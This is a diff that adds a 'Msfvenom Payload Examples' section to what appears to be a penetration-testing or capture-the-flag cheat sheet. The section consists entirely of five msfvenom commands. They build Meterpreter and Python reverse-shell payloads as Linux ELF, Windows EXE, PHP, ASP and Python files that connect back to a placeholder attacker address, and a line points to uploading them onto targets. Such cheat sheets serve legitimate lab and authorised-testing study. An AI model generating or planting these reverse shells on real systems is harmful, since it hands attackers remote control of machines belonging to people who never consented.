@@ -94,6 +94,19 @@ For SQL injection focused task either perform the injection manually or use sqlm
 <details>
 <summary>msfvenom</summary>
 
+### Msfvenom Payload Examples
+
+```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf``` - Linux.
+
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe``` - Windows.
+
+```msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php``` - PHP.
+
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp``` - ASP.
+
+ ```msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py``` - Python.
+
+ Refer to "Transfering Files" section in order to see details how to upload these shells.
 
 </details>
 
